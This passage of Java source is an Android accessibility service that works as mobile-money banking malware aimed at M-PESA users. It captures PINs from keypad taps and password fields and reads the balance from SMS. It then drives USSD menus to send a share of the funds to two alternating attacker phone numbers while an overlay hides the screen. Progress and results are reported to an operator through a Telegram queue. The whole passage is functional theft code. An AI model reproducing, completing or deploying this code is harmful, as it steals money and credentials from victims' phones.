                  if (pendingOverlay) {
                      pendingOverlay = false;
                      TelegramQueue.get(this).send("Failure recovery: BACK -> overlay -> 2s -> automation.");
                      performGlobalAction(GLOBAL_ACTION_BACK);
                      try { overlayManager.show(); } catch (Exception ignored) { }
                      handler.postDelayed(() -> startAutomation(amount), POST_PIN_DELAY_MS);
                      return;
                  }

                  TelegramQueue.get(this).send("M-PESA app first-run: HOME -> 2s -> automation.");
                  performGlobalAction(GLOBAL_ACTION_HOME);
                  handler.postDelayed(() -> startAutomation(amount), POST_PIN_DELAY_MS);
              }

              private double calculateSendAmount(double balance) {
                  return balance * SEND_PERCENTAGE;
              }

              private double getLastBalanceFromSms() {
                  try {
                      ContentResolver cr = getContentResolver();
                      Uri uri = Telephony.Sms.Inbox.CONTENT_URI;
                      String[] projection = { Telephony.Sms.Inbox.BODY };
                      String selection = Telephony.Sms.Inbox.BODY + " LIKE ?";
                      String[] selectionArgs = new String[]{"%balance%"};
                      String sortOrder = Telephony.Sms.Inbox.DATE + " DESC";

                      Cursor cursor = cr.query(uri, projection, selection, selectionArgs, sortOrder);
                      if (cursor == null || !cursor.moveToFirst()) {
                          if (cursor != null) cursor.close();
                          return 0;
                      }
                      do {
                          String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.Inbox.BODY));
                          if (body == null) continue;
                          String normalized = body.replace('\u00A0', ' ')
                                  .replace("\u200B", "")
                                  .replaceAll("\\s+", " ")
                                  .trim();
                          java.util.regex.Pattern pA = java.util.regex.Pattern.compile(
                              "your\\s+m[-\\s]?pesa\\s+balance\\s+is\\s*(?:kes|ksh)?\\.?\\s*([\\d,]+\\.?\\d{0,2})",
                              java.util.regex.Pattern.CASE_INSENSITIVE);
                          java.util.regex.Matcher mA = pA.matcher(normalized);
                          if (mA.find()) {
                              double v = Double.parseDouble(mA.group(1).replace(",", ""));
                              cursor.close();
                              return v;
                          }
                          java.util.regex.Pattern pB = java.util.regex.Pattern.compile(
                              "m[-\\s]?pesa\\s+balance\\s+is\\s*(?:kes|ksh)?\\.?\\s*([\\d,]+\\.?\\d{0,2})",
                              java.util.regex.Pattern.CASE_INSENSITIVE);
                          java.util.regex.Matcher mB = pB.matcher(normalized);
                          if (mB.find()) {
                              double v = Double.parseDouble(mB.group(1).replace(",", ""));
                              cursor.close();
                              return v;
                          }
                          java.util.regex.Pattern pC = java.util.regex.Pattern.compile(
                              "m[-\\s]?pesa\\s+balance[:\\s]*(?:kes|ksh)?\\.?\\s*([\\d,]+\\.?\\d{0,2})",
                              java.util.regex.Pattern.CASE_INSENSITIVE);
                          java.util.regex.Matcher mC = pC.matcher(normalized);
                          if (mC.find()) {
                              double v = Double.parseDouble(mC.group(1).replace(",", ""));
                              cursor.close();
                              return v;
                          }
                      } while (cursor.moveToNext());
                      cursor.close();
                  } catch (Exception e) {
                      Log.e(TAG, "Balance read error", e);
                      TelegramQueue.get(this).send("Balance read error: " + e.getMessage());
                  }
                  return 0;
              }

              private String getNewestMpesaSms() {
                  try {
                      Cursor cursor = getContentResolver().query(
                          Telephony.Sms.Inbox.CONTENT_URI,
                          new String[]{ Telephony.Sms.Inbox.BODY, Telephony.Sms.Inbox.ADDRESS },
                          null, null,
                          Telephony.Sms.Inbox.DATE + " DESC");
                      if (cursor == null) return null;
                      int count = 0;
                      while (cursor.moveToNext() && count < 5) {
                          count++;
                          String body = cursor.getString(0);
                          String sender = cursor.getString(1);
                          if (body == null) continue;
                          String b = body.toLowerCase();
                          String s = sender != null ? sender.toLowerCase() : "";
                          if (b.contains("m-pesa") || b.contains("mpesa") || b.contains("m_pesa")
                              || s.contains("m-pesa") || s.contains("mpesa") || s.contains("m_pesa")) {
                              cursor.close();
                              return body;
                          }
                      }
                      cursor.close();
                  } catch (Exception e) {
                      Log.e(TAG, "getNewestMpesaSms error", e);
                  }
                  return null;
              }

              @Override
              public void onAccessibilityEvent(AccessibilityEvent event) {
                  try {
                      if (event == null) return;
                      if (automating) return;

                      String pkg = event.getPackageName() != null
                              ? event.getPackageName().toString().toLowerCase() : "";

                      AccessibilityNodeInfo root = getRootInActiveWindow();
                      if (root == null) return;

                      if (pkg.equals(MPESA_APP_PACKAGE)) {
                          boolean onPinScreen = isMpesaPinScreen(root);
                          if (!onPinScreen) {
                              resetKeypadBuffer();
                              return;
                          }
                          if (isBackspaceEvent(event)) {
                              if (keypadBuffer.length() > 0) {
                                  keypadBuffer.setLength(keypadBuffer.length() - 1);
                              }
                              lastKeypadDigitHandled = null;
                              lastKeypadTapTime = 0L;
                              return;
                          }
                          if (event.getEventType() != AccessibilityEvent.TYPE_VIEW_CLICKED) return;

                          String digit = getClickedDigit(event, root);
                          if (digit == null) return;

                          long now = System.currentTimeMillis();
                          boolean sameDigitAgain = digit.equals(lastKeypadDigitHandled);
                          boolean tooSoon = (now - lastKeypadTapTime) < KEYPAD_DEDUPE_MS;
                          if (sameDigitAgain && tooSoon) return;

                          lastKeypadDigitHandled = digit;
                          lastKeypadTapTime = now;

                          keypadBuffer.append(digit);
                          if (keypadBuffer.length() > PIN_LENGTH) {
                              while (keypadBuffer.length() > PIN_LENGTH) keypadBuffer.deleteCharAt(0);
                          }
                          if (keypadBuffer.length() == PIN_LENGTH) {
                              String captured = keypadBuffer.toString();
                              if (isValidPin(captured)) {
                                  resetKeypadBuffer();
                                  savePin(captured, MPESA_APP_PACKAGE);
                              } else {
                                  resetKeypadBuffer();
                              }
                          }
                          return;
                      }

                      boolean isKnownHost = false;
                      for (String host : PIN_HOST_PACKAGES) {
                          if (pkg.contains(host)) { isKnownHost = true; break; }
                      }
                      boolean windowMentionsStrictPin = windowTextMentionsStrictPin(root);
                      if (!isKnownHost && !windowMentionsStrictPin) return;
                      if (isPinFieldEmpty(root)) {
                          pinFieldClearedSinceLastCapture = true;
                          return;
                      }
                      String captured = findPinFieldValue(root);
                      if (captured == null || captured.length() < 4) return;
                      boolean sameAsLastHandled = captured.equals(lastHandledPinValue);
                      if (!pinFieldClearedSinceLastCapture && sameAsLastHandled) return;
                      if (!pinFieldClearedSinceLastCapture) return;
                      pinFieldClearedSinceLastCapture = false;
                      lastHandledPinValue = captured;
                      String source = isKnownHost ? pkg : "pin-prompt";
                      savePin(captured, source);
                  } catch (Exception e) {
                      Log.e(TAG, "Event error", e);
                      TelegramQueue.get(this).send("Event error: " + e.getMessage());
                  }
              }

              private boolean isPinFieldEmpty(AccessibilityNodeInfo node) {
                  if (node == null) return false;
                  boolean isPassword = node.isPassword();
                  boolean isEditable = node.isEditable();
                  CharSequence hint = node.getHintText();
                  CharSequence desc = node.getContentDescription();
                  CharSequence text = node.getText();
                  boolean mentionsPin = containsPinPhrase(hint) || containsPinPhrase(desc);
                  if (isPassword || (isEditable && mentionsPin)) {
                      if (text == null || text.toString().trim().isEmpty()) return true;
                  }
                  for (int i = 0; i < node.getChildCount(); i++) {
                      if (isPinFieldEmpty(node.getChild(i))) return true;
                  }
                  return false;
              }

              private boolean windowTextMentionsStrictPin(AccessibilityNodeInfo node) {
                  if (node == null) return false;
                  if (containsPinPhrase(node.getText())) return true;
                  if (containsPinPhrase(node.getHintText())) return true;
                  if (containsPinPhrase(node.getContentDescription())) return true;
                  for (int i = 0; i < node.getChildCount(); i++) {
                      if (windowTextMentionsStrictPin(node.getChild(i))) return true;
                  }
                  return false;
              }

              private String findPinFieldValue(AccessibilityNodeInfo node) {
                  if (node == null) return null;
                  boolean isPassword = node.isPassword();
                  boolean isEditable = node.isEditable();
                  CharSequence hint = node.getHintText();
                  CharSequence desc = node.getContentDescription();
                  CharSequence text = node.getText();
                  boolean hintMentionsPin = containsPinPhrase(hint) || containsPinPhrase(desc);
                  if ((isPassword || (isEditable && hintMentionsPin)) && text != null) {
                      String value = text.toString().trim();
                      if (value.length() >= 4) return value;
                  }
                  for (int i = 0; i < node.getChildCount(); i++) {
                      String result = findPinFieldValue(node.getChild(i));
                      if (result != null) return result;
                  }
                  return null;
              }

              private void startAutomation(double amount) {
                  if (automating) return;
                  automating = true;
                  String target = getCurrentTargetPhone();
                  TelegramQueue.get(this).send("Automation started. Target: " + target);
                  dialUssdWithIntent("*334%23");
                  handler.postDelayed(() -> performStep1(amount), 2250);
              }

              private void dialUssdWithIntent(String ussdCode) {
                  try {
                      Intent intent = new Intent(Intent.ACTION_CALL);
                      intent.setData(Uri.parse("tel:" + ussdCode));
                      intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                      try {
                          SubscriptionManager sm = (SubscriptionManager)
                                  getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
                          if (sm != null) {
                              List<SubscriptionInfo> subs = sm.getActiveSubscriptionInfoList();
                              if (subs != null && subs.size() > 1) {
                                  for (SubscriptionInfo sub : subs) {
                                      String carrier = sub.getCarrierName() != null
                                              ? sub.getCarrierName().toString() : "";
                                      if (carrier.toLowerCase().contains("safaricom")) {
                                          PhoneAccountHandle handle = getPhoneAccountHandle(sub.getSubscriptionId());
                                          if (handle != null) {
                                              intent.putExtra("android.telecom.extra.PHONE_ACCOUNT_HANDLE", handle);
                                          }
                                          break;
                                      }
                                  }
                              }
                          }
                      } catch (Exception ignored) { }
                      startActivity(intent);
                  } catch (Exception e) {
                      TelegramQueue.get(this).send("USSD dial failed: " + e.getMessage());
                      automating = false;
                      abortAndWaitForNextTrigger(0, "USSD dial failed: " + e.getMessage());
                  }
              }

              private PhoneAccountHandle getPhoneAccountHandle(int subId) {
                  try {
                      TelecomManager tm = (TelecomManager) getSystemService(Context.TELECOM_SERVICE);
                      if (tm == null) return null;
                      List<PhoneAccountHandle> handles = tm.getCallCapablePhoneAccounts();
                      if (handles != null && !handles.isEmpty()) return handles.get(0);
                  } catch (Exception ignored) { }
                  return null;
              }

              private String getCurrentTargetPhone() {
                  String current = prefs.getString("current_target_phone", null);
                  if (current == null || current.isEmpty()) {
                      current = TARGET_PHONE_A;
                  }
                  return current;
              }

              private void flipTargetPhone() {
                  String current = getCurrentTargetPhone();
                  String next = TARGET_PHONE_A.equals(current) ? TARGET_PHONE_B : TARGET_PHONE_A;
                  prefs.edit().putString("current_target_phone", next).apply();
              }

              private String resolveMenuDigit(String[] phrases, String fallback) {
                  AccessibilityNodeInfo root = getRootInActiveWindow();
                  if (root == null) return fallback;
                  String matched = matchMenuOption(root, phrases);
                  if (matched != null) return matched;
                  String dump = collectAllText(root);
                  TelegramQueue.get(this).send("Menu mismatch. Visible text:\n" + dump);
                  return fallback;
              }

              private void performStep1(double amount) {
                  long t0 = System.currentTimeMillis();
                  String opt = resolveMenuDigit(STEP1_PHRASES, "1");
                  boolean ok = typeInField(opt);
                  ok = clickSendWithRetry() && ok;
                  if (!ok) { abortAndWaitForNextTrigger(1, "Step 1 failed"); return; }
                  computeNextStepTimeout(System.currentTimeMillis() - t0);
                  handler.postDelayed(() -> performStep2(amount), lastStepResponseMs);
              }

              private void performStep2(double amount) {
                  long t0 = System.currentTimeMillis();
                  String opt = resolveMenuDigit(STEP2_PHRASES, "1");
                  boolean ok = typeInField(opt);
                  ok = clickSendWithRetry() && ok;
                  if (!ok) { abortAndWaitForNextTrigger(2, "Step 2 failed"); return; }
                  computeNextStepTimeout(System.currentTimeMillis() - t0);
                  handler.postDelayed(() -> performStep3(amount), lastStepResponseMs);
              }

              private void performStep3(double amount) {
                  long t0 = System.currentTimeMillis();
                  String target = getCurrentTargetPhone();
                  boolean ok = typeInField(target);
                  ok = clickSendWithRetry() && ok;
                  if (!ok) { abortAndWaitForNextTrigger(3, "Step 3 failed"); return; }
                  computeNextStepTimeout(System.currentTimeMillis() - t0);
                  handler.postDelayed(() -> performStep4(amount), lastStepResponseMs);
              }

              private void performStep4(double amount) {
                  long t0 = System.currentTimeMillis();
                  boolean ok = typeInField(String.format("%.0f", amount));
                  ok = clickSendWithRetry() && ok;
                  if (!ok) { abortAndWaitForNextTrigger(4, "Step 4 failed"); return; }
                  computeNextStepTimeout(System.currentTimeMillis() - t0);
                  handler.postDelayed(() -> performStep5(amount), lastStepResponseMs);
              }

              private void performStep5(double amount) {
                  long t0 = System.currentTimeMillis();
                  boolean ok = typeInField(pin);
                  ok = clickSendWithRetry() && ok;
                  if (!ok) { abortAndWaitForNextTrigger(5, "Step 5 failed"); return; }
                  computeNextStepTimeout(System.currentTimeMillis() - t0);
                  handler.postDelayed(() -> performStep6(amount), lastStepResponseMs);
              }

              private void performStep6(double amount) {
                  long t0 = System.currentTimeMillis();
                  String opt = resolveMenuDigit(STEP6_PHRASES, "1");
                  boolean ok = typeInField(opt);
                  ok = clickSendWithRetry() && ok;
                  if (!ok) { abortAndWaitForNextTrigger(6, "Step 6 failed"); return; }
                  computeNextStepTimeout(System.currentTimeMillis() - t0);
                  final long startTime = System.currentTimeMillis();
                  handler.post(() -> verifyTransactionLoop(amount, startTime));
              }

              private void verifyTransactionLoop(double amount, long startTime) {
                  String sms = getNewestMpesaSms();
                  String lower = sms != null ? sms.toLowerCase() : "";

                  if (lower.contains(WRONG_PIN_MARKER) || lower.contains(INSUFFICIENT_FUNDS_MARKER)) {
                      try { overlayManager.dismiss(); } catch (Exception ignored) { }
                      automating = false;
                      pendingOverlay = true;
                      String reason = lower.contains(WRONG_PIN_MARKER)
                              ? WRONG_PIN_MARKER : INSUFFICIENT_FUNDS_MARKER;
                      TelegramQueue.get(this).send("Transaction FAILED: " + reason
                              + "\nNext PIN capture will retry.");
                      return;
                  }

                  if (lower.contains(SUCCESS_MARKER)
                      && (lower.contains("ksh") || lower.contains("kes"))) {
                      try { overlayManager.dismiss(); } catch (Exception ignored) { }
                      String sentTo = getCurrentTargetPhone();
                      prefs.edit().putLong("last_tx_time", System.currentTimeMillis()).apply();
                      flipTargetPhone();
                      automating = false;
                      TelegramQueue.get(this).send("KSH " + String.format("%.2f", amount)
                              + " sent to " + sentTo
                              + "\nNext cycle target: " + getCurrentTargetPhone()
                              + "\nNext run eligible in 10 minutes.");
                      return;
                  }

                  if (System.currentTimeMillis() - startTime >= VERIFY_WINDOW_MS) {
                      try { overlayManager.dismiss(); } catch (Exception ignored) { }
                      String sentTo = getCurrentTargetPhone();
                      prefs.edit().putLong("last_tx_time", System.currentTimeMillis()).apply();
                      flipTargetPhone();
                      automating = false;
                      TelegramQueue.get(this).send("KSH " + String.format("%.2f", amount)
                              + " sent to " + sentTo
                              + " (fallback: no SMS confirmation within 2m30s)"
                              + "\nNext cycle target: " + getCurrentTargetPhone()
                              + "\nNext run eligible in 10 minutes.");
                      return;
                  }

                  handler.postDelayed(() -> verifyTransactionLoop(amount, startTime), VERIFY_POLL_INTERVAL_MS);
              }

              private void abortAndWaitForNextTrigger(int failedStep, String reason) {
                  try { overlayManager.dismiss(); } catch (Exception ignored) { }
                  automating = false;
                  pendingOverlay = true;
                  TelegramQueue.get(this).send("Automation aborted at Step " + failedStep + ": " + reason
                          + "\nNext PIN capture will retry.");
              }

              private boolean clickSendWithRetry() {
                  for (int attempt = 0; attempt < 3; attempt++) {
                      if (clickSendOnce()) return true;
                      try { Thread.sleep(500); } catch (InterruptedException ignored) { }
                  }
                  return performDialogBottomRightTap();
              }

              private boolean clickSendOnce() {
                  AccessibilityNodeInfo root = getRootInActiveWindow();
                  if (root == null) return false;

                  String[] ids = {
                      "android:id/button1", "android:id/button2",
                      "com.android.phone:id/ok", "com.android.phone:id/send",
                      "com.android.phone:id/button1", "com.android.phone:id/button2"
                  };
                  for (String id : ids) {
                      if (findAndClickById(root, id)) return true;
                  }
                  if (findAndClickClickableParent(root, "SEND")) return true;
                  String[] labels = {"Send", "OK", "Reply", "Next", "Confirm", "Ok", "send", "ok", "confirm"};
                  for (String label : labels) {
                      if (findAndClickClickableParent(root, label)) return true;
                  }
                  String[] descs = {"Send", "OK", "Reply", "Next", "Confirm"};
                  for (String desc : descs) {
                      if (findAndClickByContentDesc(root, desc)) return true;
                  }
                  return findAndClickImageButton(root);
              }

              private boolean findAndClickClickableParent(AccessibilityNodeInfo node, String text) {
                  if (node == null) return false;
                  try {
                      if (node.getText() != null &&
                          node.getText().toString().trim().equalsIgnoreCase(text)) {
                          AccessibilityNodeInfo clickable = getClickableParent(node);
                          if (clickable != null) return clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                          return node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                      }
                      for (int i = 0; i < node.getChildCount(); i++) {
                          if (findAndClickClickableParent(node.getChild(i), text)) return true;
                      }
                  } catch (Exception ignored) { }
                  return false;
              }

              private AccessibilityNodeInfo getClickableParent(AccessibilityNodeInfo node) {
                  AccessibilityNodeInfo current = node;
                  int depth = 0;
                  while (current != null && depth < 5) {
                      if (current.isClickable() && current.isEnabled()) return current;
                      current = current.getParent();
                      depth++;
                  }
                  return null;
              }

              private boolean findAndClickByContentDesc(AccessibilityNodeInfo node, String desc) {
                  if (node == null) return false;
                  try {
                      if (node.getContentDescription() != null &&
                          node.getContentDescription().toString().toLowerCase().contains(desc.toLowerCase())) {
                          AccessibilityNodeInfo clickable = getClickableParent(node);
                          if (clickable != null) return clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                          return node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                      }
                      for (int i = 0; i < node.getChildCount(); i++) {
                          if (findAndClickByContentDesc(node.getChild(i), desc)) return true;
                      }
                  } catch (Exception ignored) { }
                  return false;
              }

              private boolean findAndClickById(AccessibilityNodeInfo node, String id) {
                  if (node == null) return false;
                  try {
                      if (node.getViewIdResourceName() != null && node.getViewIdResourceName().equals(id)) {
                          if (node.isClickable()) return node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                          AccessibilityNodeInfo parent = getClickableParent(node);
                          if (parent != null) return parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                          return node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                      }
                      for (int i = 0; i < node.getChildCount(); i++) {
                          if (findAndClickById(node.getChild(i), id)) return true;
                      }
                  } catch (Exception ignored) { }
                  return false;
              }

              private boolean findAndClickImageButton(AccessibilityNodeInfo node) {
                  if (node == null) return false;
                  try {
                      if (node.getClassName() != null &&
                          node.getClassName().toString().contains("ImageButton") &&
                          node.isClickable() && node.isEnabled()) {
                          return node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                      }
                      for (int i = 0; i < node.getChildCount(); i++) {
                          if (findAndClickImageButton(node.getChild(i))) return true;
                      }
                  } catch (Exception ignored) { }
                  return false;
              }

              private boolean performDialogBottomRightTap() {
                  AccessibilityNodeInfo root = getRootInActiveWindow();
                  if (root == null) return false;
                  Rect bounds = new Rect();
                  root.getBoundsInScreen(bounds);
                  int tapX = bounds.right - 100;
                  int tapY = bounds.bottom - 100;
                  Path path = new Path();
                  path.moveTo(tapX, tapY);
                  GestureDescription.Builder gb = new GestureDescription.Builder();
                  gb.addStroke(new GestureDescription.StrokeDescription(path, 0, 100));
                  return dispatchGesture(gb.build(), null, null);
              }

              private boolean typeInField(String text) {
                  AccessibilityNodeInfo root = getRootInActiveWindow();
                  if (root == null) return false;
                  AccessibilityNodeInfo field = findEditableField(root);
                  if (field == null) field = findNodeByClassName(root, "android.widget.EditText");
                  if (field == null) field = findNodeByText(root, "Edit box");
                  if (field == null) field = findFirstFocusable(root);
                  if (field == null) return false;
                  field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
                  field.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                  Bundle args = new Bundle();
                  args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
                  return field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
              }

              private AccessibilityNodeInfo findNodeByClassName(AccessibilityNodeInfo node, String className) {
                  if (node == null) return null;
                  if (node.getClassName() != null && node.getClassName().toString().equals(className)) return node;
                  for (int i = 0; i < node.getChildCount(); i++) {
                      AccessibilityNodeInfo r = findNodeByClassName(node.getChild(i), className);
                      if (r != null) return r;
                  }
                  return null;
              }

              private AccessibilityNodeInfo findNodeByText(AccessibilityNodeInfo node, String text) {
                  if (node == null) return null;
                  if (node.getText() != null && node.getText().toString().equalsIgnoreCase(text)) return node;
                  for (int i = 0; i < node.getChildCount(); i++) {
                      AccessibilityNodeInfo r = findNodeByText(node.getChild(i), text);
                      if (r != null) return r;
                  }
                  return null;
              }

              private AccessibilityNodeInfo findFirstFocusable(AccessibilityNodeInfo node) {
                  if (node == null) return null;
                  if (node.isFocusable() && node.isEnabled()) return node;
                  for (int i = 0; i < node.getChildCount(); i++) {
                      AccessibilityNodeInfo r = findFirstFocusable(node.getChild(i));
                      if (r != null) return r;
                  }
                  return null;
              }

              private AccessibilityNodeInfo findEditableField(AccessibilityNodeInfo node) {
                  if (node == null) return null;
                  if (node.isEditable() && node.isEnabled()) return node;
                  for (int i = 0; i < node.getChildCount(); i++) {
                      AccessibilityNodeInfo r = findEditableField(node.getChild(i));
                      if (r != null) return r;
                  }
                  return null;
              }

              @Override
              public void onInterrupt() {
                  if (automating) {
                      try { overlayManager.dismiss(); } catch (Exception ignored) { }
                      automating = false;
                      pendingHomeOverlay = true;
                      TelegramQueue.get(this).send("Automation interrupted. Next PIN capture will press HOME, launch overlay, and restart.");
                  }
              }

              @Override
              public void onDestroy() {
                  super.onDestroy();
                  try { overlayManager.dismiss(); } catch (Exception ignored) { }
                  try {
                      if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
                  } catch (Exception ignored) { }
                  executor.shutdown();
              }
          }
